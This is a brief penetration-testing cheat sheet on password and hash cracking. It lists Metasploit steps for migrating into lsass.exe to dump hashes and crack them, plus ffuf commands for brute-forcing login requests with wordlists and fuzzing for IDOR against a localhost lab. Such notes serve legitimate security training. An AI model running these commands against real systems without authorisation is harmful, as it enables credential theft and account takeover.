# Password & Hask Cracking

base64 decode

```bash
base64 -d test.txt
```

Metasploit

```bash
migrate -N lsass.exe
#first must be able to use hashdump
#then this will try to crack from creds command
use auxiliary/analyze/crack_windows
use auxiliary/analyze/crack_linux
```

ffuf

```bash
ffuf -request req.txt -request-proto http -w /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-10000.txt

ffuf -request req.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZPASS -w /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER -fs 3256

#idor
ffuf -u 'http://localhost/labs/e0x02.php?account=FUZZ' -w idor.txt -fs 849
```

